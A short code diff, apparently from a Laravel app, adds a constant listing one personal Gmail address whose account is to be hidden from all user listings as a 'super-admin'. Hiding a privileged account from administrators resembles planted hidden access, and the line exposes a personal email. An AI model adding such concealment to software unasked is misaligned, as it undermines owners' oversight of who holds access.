@@ -15,6 +15,9 @@ class User extends Authenticatable
     /** @use HasFactory<\Database\Factories\UserFactory> */
     use HasFactory, Notifiable;
 
+    // Emails hidden from all user listings (system/super-admin accounts)
+    const HIDDEN_EMAILS = ['donia.a5ra2019@gmail.com'];
+
     /**
      * The attributes that are mass assignable.
      *
